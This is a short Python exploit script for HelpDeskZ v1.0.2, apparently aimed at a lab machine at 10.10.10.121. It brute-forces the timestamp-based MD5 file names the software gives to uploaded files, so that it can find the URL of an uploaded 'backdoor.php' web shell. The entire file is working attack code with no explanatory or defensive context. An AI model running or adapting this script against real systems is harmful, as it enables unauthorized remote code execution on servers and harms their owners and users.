import hashlib
import time
import sys
import requests

print('Helpdeskz v1.0.2 - Unauthenticated shell upload exploit')

helpdeskzBaseUrl = "http://10.10.10.121/support/"
fileName = "backdoor.php"

currentTime = int(time.time())

for x in range(0, 10000):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext.encode("utf-8")).hexdigest()

    url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print("found!")
        print(url)
        sys.exit(0)

print("Sorry, I did not find anything")
